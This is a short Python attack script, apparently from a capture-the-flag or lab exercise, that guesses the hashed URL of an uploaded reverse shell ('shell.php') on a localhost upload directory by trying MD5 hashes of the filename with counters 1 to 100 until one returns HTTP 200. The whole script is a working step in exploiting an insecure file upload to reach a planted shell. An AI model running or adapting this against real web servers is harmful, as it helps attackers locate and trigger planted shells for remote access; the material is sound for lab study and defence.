#!/usr/bin/env python3
#hashlib to generate the hashes and then requests to perform the requests
#use request.status_code and check for code 200 (OK)

from hashlib import md5
import requests

base_url = "http://localhost:8000/uploads/"
base_name = "shell.php" # name of the reverse shell file u uploaded

for x in range(1, 101):
    url_hash = md5((base_name + str(x)).encode('utf-8')).hexdigest()
    req_url = base_url + url_hash +  ".php"
    
    print(("Trying url #" + str(x)) + " " + req_url + " : Code ", end="")
    r = requests.get(req_url)
    print(r.status_code)
    
    if r.status_code == 200:
        print("\n\nFound the reverse shell url: " + req_url)
        break